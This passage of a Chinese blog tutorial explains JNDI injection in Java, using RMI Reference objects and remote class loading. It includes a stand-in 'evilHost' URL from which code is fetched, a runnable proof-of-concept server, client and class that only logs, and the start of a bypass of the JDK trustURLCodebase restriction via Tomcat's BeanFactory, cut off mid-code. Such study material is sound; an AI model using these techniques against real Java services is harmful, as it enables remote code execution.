+<p>为了在命名服务或目录服务中绑定<code>Java</code>对象，可以使用<code>Java</code>序列化来传输对象，但有时候不太合适，比如<code>Java</code>对象较大的情况。因此JNDI定义了命名引用(<code>Naming References</code>)，后面直接简称引用(<code>References</code>)。这样对象就可以通过绑定一个可以被命名管理器(<code>Naming Manager</code>)解码并解析为原始对象的引用，间接地存储在命名或目录服务中。
+引用由<code>Reference</code>类来表示，它由地址(<code>RefAddress</code>)的有序列表和所引用对象的信息组成。而每个地址包含了如何构造对应的对象的信息，包括引用对象的<code>Java</code>类名，以及用于创建对象的<code>ObjectFactory</code>类的名称和位置。
+<code>Reference</code>可以使用<code>ObjectFactory</code>来构造对象。当使用<code>lookup()</code>方法查找对象时，<code>Reference</code>将使用提供的<code>ObjectFactory</code>类的加载地址来加载<code>ObjectFactory</code>类，<code>ObjectFactory</code>类将构造出需要的对象。</p>
+<p>所谓的 <code>JNDI</code> 注入就是控制 <code>lookup</code> 函数的参数，这样来使客户端访问恶意的 <code>RMI</code> 或者 <code>LDAP</code> 服务来加载恶意的对象，从而执行代码，完成利用
+在 <code>JNDI</code> 服务中，通过绑定一个外部远程对象让客户端请求，从而使客户端恶意代码执行的方式就是利用 <code>Reference</code> 类实现的。<code>Reference</code> 类表示对存在于命名/目录系统以外的对象的引用。
+具体则是指如果远程获取 <code>RMI</code> 服务器上的对象为 <code>Reference</code> 类或者其子类时，则可以从其他服务器上加载 <code>class</code> 字节码文件来实例化
+<code>Reference</code> 类常用属性：</p>
+<pre tabindex="0"><code>className 远程加载时所使用的类名
+classFactory 加载的 class 中需要实例化类的名称
+classFactoryLocation 提供 classes 数据的地址可以是 file/ftp/http 等协议
+</code></pre><p>例：</p>
+<pre tabindex="0"><code>Reference reference = new Reference(&#34;Exploit&#34;,&#34;Exploit&#34;,&#34;http://evilHost/&#34; );           
+registry.bind(&#34;Exploit&#34;, new ReferenceWrapper(reference));
+</code></pre><p>此时，假设使用<code>rmi</code>协议，客户端通过<code>lookup</code>函数请求上面<code>bind</code>设置的<code>Exploit</code></p>
+<pre tabindex="0"><code>Context ctx = new InitialContext();
+ctx.lookup(&#34;rmi://evilHost/Exploit&#34;);
+</code></pre><p>因为绑定的是 <code>Reference</code> 对象，客户端在本地 <code>CLASSPATH</code> 查找 <code>Exploit</code> 类，如果没有则根据设定的 <code>Reference</code> 属性，到<code>URL</code>： <a href="http://evilhost/Exploit.class">http://evilHost/Exploit.class</a> 获取构造对象实例，构造方法中的恶意代码就会被执行</p>
+<h1 id="jndi-rmi">JNDI RMI</h1>
+<h2 id="低版本jdk运行">低版本jdk运行</h2>
+<p><code>jdk &lt;=6u132,7u122,8u113</code></p>
+<p><strong>服务端代码</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.naming.Reference<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.rmi.registry.LocateRegistry<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.rmi.registry.Registry<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ServerExp</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String args<span style="color:#f92672">[])</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            Registry registry <span style="color:#f92672">=</span> LocateRegistry<span style="color:#f92672">.</span><span style="color:#a6e22e">createRegistry</span><span style="color:#f92672">(</span><span style="color:#ae81ff">1099</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            String factoryUrl <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://localhost:1098/&#34;</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            Reference reference <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Reference<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;EvilClass&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;EvilClass&#34;</span><span style="color:#f92672">,</span> factoryUrl<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            ReferenceWrapper wrapper <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ReferenceWrapper<span style="color:#f92672">(</span>reference<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            registry<span style="color:#f92672">.</span><span style="color:#a6e22e">bind</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;test&#34;</span><span style="color:#f92672">,</span> wrapper<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            System<span style="color:#f92672">.</span><span style="color:#a6e22e">err</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Server ready, factoryUrl:&#34;</span> <span style="color:#f92672">+</span> factoryUrl<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            System<span style="color:#f92672">.</span><span style="color:#a6e22e">err</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Server exception: &#34;</span> <span style="color:#f92672">+</span> e<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">());</span>
+</span></span><span style="display:flex;"><span>            e<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p><strong>客户端代码</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.naming.InitialContext<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.naming.NamingException<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.naming.directory.*<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Hashtable<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">JNDILookup</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String<span style="color:#f92672">[]</span> args<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            Object ret <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InitialContext<span style="color:#f92672">().</span><span style="color:#a6e22e">lookup</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;rmi://127.0.0.1:1099/test&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ret: &#34;</span> <span style="color:#f92672">+</span> ret<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>NamingException e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            e<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p><strong>恶意类</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.naming.Context<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.naming.Name<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.naming.spi.ObjectFactory<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Hashtable<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">EvilClass</span> <span style="color:#66d9ef">implements</span> ObjectFactory <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">log</span><span style="color:#f92672">(</span>String key<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;EvilClass: &#34;</span> <span style="color:#f92672">+</span> key<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// do nothing
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        EvilClass<span style="color:#f92672">.</span><span style="color:#a6e22e">log</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;IIB block&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        EvilClass<span style="color:#f92672">.</span><span style="color:#a6e22e">log</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;static block&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">EvilClass</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        EvilClass<span style="color:#f92672">.</span><span style="color:#a6e22e">log</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;constructor&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">getObjectInstance</span><span style="color:#f92672">(</span>Object obj<span style="color:#f92672">,</span> Name name<span style="color:#f92672">,</span> Context nameCtx<span style="color:#f92672">,</span> Hashtable<span style="color:#f92672">&lt;?,</span> <span style="color:#f92672">?&gt;</span> environment<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        EvilClass<span style="color:#f92672">.</span><span style="color:#a6e22e">log</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;getObjectInstance&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>将恶意类编译成为<code>class</code>文件，然后在那个目录起个<code>python</code>服务器</p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823104720858.png" alt="image-20230823104720858"></p>
+<p>启动服务端</p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823104743471.png" alt="image-20230823104743471"></p>
+<p>启动客户端</p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823104756512.png" alt="image-20230823104756512"></p>
+<p>可以看到客户端中远程的类的代码按照顺序被执行</p>
+<pre tabindex="0"><code>static在类加载的时候执行
+代码块和无参构造方法在clas.newInstance()时执行
+</code></pre><h2 id="高版本jdk运行">高版本jdk运行</h2>
+<p><code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code> 开始 <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认值为<code>false</code>，运行时需加入参数 <code>-Dcom.sun.jndi.rmi.object.trustURLCodebase=true</code> 。因为如果 <code>JDK</code> 高于这些版本，默认是不信任远程代码的，因此也就无法加载远程 <code>RMI</code> 代码。
+不加参数，抛出异常：</p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823105332558.png" alt="image-20230823105332558"></p>
+<p>加入参数就可以正常运行</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>System<span style="color:#f92672">.</span><span style="color:#a6e22e">setProperty</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;com.sun.jndi.rmi.object.trustURLCodebase&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">);</span>
+</span></span></code></pre></div><p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823105609079.png" alt="image-20230823105609079"></p>
+<h3 id="异常分析">异常分析</h3>
+<p>上面高版本 <code>JDK</code> 中无法加载远程代码的异常出现在 <code>com.sun.jndi.rmi.registry.RegistryContext#decodeObject</code> 中</p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823112439468.png" alt="image-20230823112439468"></p>
+<p>其中 <code>getFactoryClassLocation()</code>方法是获取<code>classFactoryLocation</code>地址，这里会对 <code>trustURLCodebase</code> 进行取反，由于在 <code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code> 版本及以后， <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认为 <code>false</code> ，所以会进入 <code>if</code> 语句，抛出异常。</p>
+<h3 id="绕过">绕过</h3>
+<p>如果要解码的对象 <code>r</code> 是远程引用，就需要先解引用然后再调用 <code>NamingManager.getObjectInstance</code>，其中会实例化对应的 <code>ObjectFactory</code> 类并调用其 <code>getObjectInstance</code> 方法，这也符合我们前面打印的 <code>EvilClass</code> 的执行顺序。</p>
+<p>为了绕过这里 <code>ConfigurationException</code> 的限制，我们有三种办法，令<code>var8</code>即<code>ref</code>为空，或者令</p>
+<p><code>var8.getFactoryClassLocation()</code>即<code>ref.getFactoryClassLocation()</code> 为空，或者  令 <code>trustURLCodebase</code> 为 <code>true</code></p>
+<p>方法一：令ref为空，从语义上看不能是对象引用，只能是原始对象，这时客户端直接实例化本地对象，远程<code>RMI</code>没有操作空间，这种情况不好利用</p>
+<p>方法二：令<code>ref.getFactoryClassLocation()</code> 返回空。即，让<code>ref</code>对象的 <code>classFactoryLocation</code> 属性为空，这个属性表示引用所指向对象的对应的<code>factory</code>的名称，对于远程代码加载而言是 <code>codebase</code>，即远程代码的 <code>URL</code> 地址(可以是多个地址，以空格分隔)，这正是我们上文针对低版本的利用方法；如果对应的 <code>factory</code> 是本地代码，则该值为空，这是绕过高版本 <code>JDK</code> 限制的关键；</p>
+<p>方法三：我们已经在上面用过，即在命令行指定 <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 参数。</p>
+<p>可以看一下<code>getFactoryClassLocation()</code>方法，以及返回值的赋值情况。</p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823141401276.png" alt="image-20230823141401276"></p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823141506456.png" alt="image-20230823141506456"></p>
+<p>要满足方法二情况，我们只需要在远程 <code>RMI</code> 服务器返回的 <code>Reference</code> 对象中不指定 <code>Factory</code> 的 <code>codebase</code>。接着看一下 <code>javax.naming.spi.NamingManager</code> 的解析过程</p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823142534254.png" alt="image-20230823142534254"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">//javax/naming/spi/NamingManager.java
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Object
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">getObjectInstance</span><span style="color:#f92672">(</span>Object refInfo<span style="color:#f92672">,</span> Name name<span style="color:#f92672">,</span> Context nameCtx<span style="color:#f92672">,</span>
+</span></span><span style="display:flex;"><span>                          Hashtable<span style="color:#f92672">&lt;?,?&gt;</span> environment<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throws</span> Exception
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ObjectFactory factory<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Use builder if installed
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        ObjectFactoryBuilder builder <span style="color:#f92672">=</span> getObjectFactoryBuilder<span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>builder <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// builder must return non-null factory
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            factory <span style="color:#f92672">=</span> builder<span style="color:#f92672">.</span><span style="color:#a6e22e">createObjectFactory</span><span style="color:#f92672">(</span>refInfo<span style="color:#f92672">,</span> environment<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> factory<span style="color:#f92672">.</span><span style="color:#a6e22e">getObjectInstance</span><span style="color:#f92672">(</span>refInfo<span style="color:#f92672">,</span> name<span style="color:#f92672">,</span> nameCtx<span style="color:#f92672">,</span>
+</span></span><span style="display:flex;"><span>                environment<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Use reference if possible
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        Reference ref <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>refInfo <span style="color:#66d9ef">instanceof</span> Reference<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            ref <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Reference<span style="color:#f92672">)</span> refInfo<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>refInfo <span style="color:#66d9ef">instanceof</span> Referenceable<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            ref <span style="color:#f92672">=</span> <span style="color:#f92672">((</span>Referenceable<span style="color:#f92672">)(</span>refInfo<span style="color:#f92672">)).</span><span style="color:#a6e22e">getReference</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Object answer<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>ref <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            String f <span style="color:#f92672">=</span> ref<span style="color:#f92672">.</span><span style="color:#a6e22e">getFactoryClassName</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>f <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">// if reference identifies a factory, use exclusively
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>                factory <span style="color:#f92672">=</span> getObjectFactoryFromReference<span style="color:#f92672">(</span>ref<span style="color:#f92672">,</span> f<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>factory <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> factory<span style="color:#f92672">.</span><span style="color:#a6e22e">getObjectInstance</span><span style="color:#f92672">(</span>ref<span style="color:#f92672">,</span> name<span style="color:#f92672">,</span> nameCtx<span style="color:#f92672">,</span>
+</span></span><span style="display:flex;"><span>                                                     environment<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">// No factory found, so return original refInfo.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#75715e">// Will reach this point if factory class is not in
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#75715e">// class path and reference does not contain a URL for it
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#66d9ef">return</span> refInfo<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">// if reference has no factory, check for addresses
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#75715e">// containing URLs
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>                answer <span style="color:#f92672">=</span> processURLAddrs<span style="color:#f92672">(</span>ref<span style="color:#f92672">,</span> name<span style="color:#f92672">,</span> nameCtx<span style="color:#f92672">,</span> environment<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>answer <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> answer<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// try using any specified factories
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        answer <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>            createObjectFromFactories<span style="color:#f92672">(</span>refInfo<span style="color:#f92672">,</span> name<span style="color:#f92672">,</span> nameCtx<span style="color:#f92672">,</span> environment<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">(</span>answer <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">?</span> answer <span style="color:#f92672">:</span> refInfo<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span></code></pre></div><p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823145417999.png" alt="image-20230823145417999"></p>
+<p>可以看到，在处理 <code>Reference</code> 对象时，会先调用 <code>ref.getFactoryClassName()</code> 获取对应工厂类的名称，也就是会先从本地的<code>CLASSPATH</code>中寻找该类。如果不为空则直接实例化工厂类，并通过工厂类去实例化一个对象并返回；如果为空则通过网络去请求，即前文中的情况。</p>
+<p>之后会执行静态代码块、代码块、无参构造函数和<code>getObjectInstance</code>方法。那么只需要在攻击者本地<code>CLASSPATH</code>找到这个<code>Reference Factory</code>类并且在这四个地方其中一块能执行<code>payload</code>就可以了。但<code>getObjectInstance</code>方法需要你的类实现<code>javax.naming.spi.ObjectFactory</code>接口</p>
+<p>因此，我们实际上可以指定一个存在于目标 <code>classpath</code> 中的工厂类名称，交由这个工厂类去实例化实际的目标类(即引用所指向的类)，从而间接实现一定的代码控制。
+整个利用过程的主要调用栈如下：</p>
+<pre tabindex="0"><code>InitialContext#lookup()
+  RegistryContext#lookup()
+    RegistryContext#decodeObject()
+      NamingManager#getObjectInstance()
+          objectfactory = NamingManager#getObjectFactoryFromReference()
+                  Class#newInstance()  //--&gt;恶意代码被执行
+     或:   objectfactory#getObjectInstance()  //--&gt;恶意代码被执行
+</code></pre><p>所以满足的工厂类条件：</p>
+<p>1.存在于目标本地的<code>CLASSPATH</code>中</p>
+<p>2.实现<code>javax.naming.spi.ObjectFactory</code>接口</p>
+<p>3.至少存在一个<code>getObjectInstance()</code>方法</p>
+<p>我们可以选择</p>
+<p><code>Tomcat</code> 依赖包中的 <code>org.apache.naming.factory.BeanFactory</code></p>
+<h3 id="环境搭建">环境搭建</h3>
+<pre tabindex="0"><code>        &lt;dependency&gt;
+            &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;
+            &lt;artifactId&gt;tomcat-embed-el&lt;/artifactId&gt;
+            &lt;version&gt;8.5.15&lt;/version&gt;
+        &lt;/dependency&gt;
+</code></pre><p>这个作为服务端</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.naming.ResourceRef<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.naming.StringRefAddr<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.rmi.registry.LocateRegistry<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.rmi.registry.Registry<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>
